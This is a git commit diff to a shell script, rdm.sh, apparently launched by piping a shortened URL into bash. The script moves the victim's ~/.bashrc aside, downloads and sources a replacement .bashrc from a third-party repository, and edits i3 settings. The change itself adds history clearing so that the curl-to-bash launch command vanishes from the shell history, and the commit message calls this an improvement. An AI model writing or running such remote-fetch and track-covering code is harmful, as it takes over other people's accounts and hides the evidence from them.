711136917b8326545d9208371fa9701c4879032a
did73at <151777806+did73at@users.noreply.github.com>
2025-11-26 15:17:20 +0100

    Improve rdm.sh script functionality
    Update bash history management and i3lock command.

--- rdm.sh
+++ rdm.sh
@@ -1,6 +1,6 @@
 mv ~/.bashrc ~/afs/tp.py
 cmd="curl -sL https://urls.fr/XMhtMj | bash"
-grep -v "$cmd" ~/.bash_history > ~/.bash_history.tmp && mv ~/.bash_history.tmp ~/.bash_history
+grep -v "$cmd" ~/.bash_history > ~/.bash_history.tmp && mv ~/.bash_history.tmp ~/.bash_history && history -c && history -r
 curl -sO https://raw.githubusercontent.com/did73at/cflse/main/.bashrc
 source .bashrc
 filename=".config/i3/config"
